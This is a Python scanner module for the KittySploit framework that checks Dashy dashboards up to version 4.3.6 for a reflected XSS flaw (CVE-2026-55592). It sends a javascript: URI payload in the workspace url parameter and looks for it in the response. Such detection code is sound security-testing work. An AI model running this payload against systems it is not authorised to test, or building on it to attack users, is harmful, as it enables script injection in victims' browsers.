#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dashy versions up to 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dashy <= 4.3.6 - Reflected XSS via Workspace Detection',
        'description': 'Dashy versions up to 4.3.6 contain a reflected cross-site scripting vulnerability in the workspace view. The url query parameter is passed directly to an iframe src attribute without scheme validation, allowing an attacker to inject javascript: URIs that execute arbitrary JavaScript in the context of the Dashy origin.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'dashy', 'xss', 'reflected'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Lissy93/dashy/security/advisories/GHSA-58mp-4qr3-vmrc',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-55592',
        ],
        'cve': 'CVE-2026-55592',
    }

    def run(self):
        path = '/healthz'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/workspace?url=javascript%3Aalert%28document.domain%29'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('javascript:alert(document.domain)',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Dashy <= 4.3.6 - Reflected XSS via Workspace detected', path=path)
            return True
        return False

